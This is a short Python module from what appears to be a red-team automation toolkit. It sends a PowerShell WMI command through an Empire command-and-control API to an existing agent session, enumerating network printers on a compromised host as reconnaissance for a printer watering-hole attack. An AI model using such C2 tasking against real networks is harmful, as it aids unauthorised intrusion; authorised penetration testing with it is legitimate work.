"""
Enumerate network printers
Get-WMIObject -Class Win32_Printer -Computer $env:computername | Select Name,DriverName,PortName,Network | ft -auto
Details: https://blog.vectra.ai/blog/microsoft-windows-printer-wateringhole-attack
"""
from EmpireAPIWrapper import empireAPI
from c2_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER

def run(API, agent_name):
    """
    Find network printer(s) info 
    \n:param API: EmpireAPIWrapper object
    \n:param agent_name: name of existing session
    \n:return type: string
    """

    opts = {'Agent': agent_name }
    opts['command'] = r"Get-WMIObject -Class Win32_Printer -Computer $env:computername | Where {$_.Network -eq “True”} | Select *"
    r = API.agent_run_shell_cmd_with_result(agent_name, opts)
    return r

if __name__ == '__main__': # unit test
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    print(run(API, API.agents()['agents'][0]['name']))